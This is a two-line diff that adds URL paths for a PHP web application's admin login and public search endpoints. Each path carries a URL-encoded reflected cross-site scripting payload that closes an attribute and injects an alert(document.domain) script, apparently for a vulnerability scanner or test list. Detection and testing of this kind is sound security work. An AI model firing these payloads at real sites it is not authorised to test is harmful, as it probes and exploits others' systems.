@@ -1,0 +1,2 @@
+/index.php/gm5rj%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3Ebwude?controller=pjAdmin&action=pjActionLogin&err=1
+/index.php?controller=pjFrontPublic&action=pjActionSearch&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
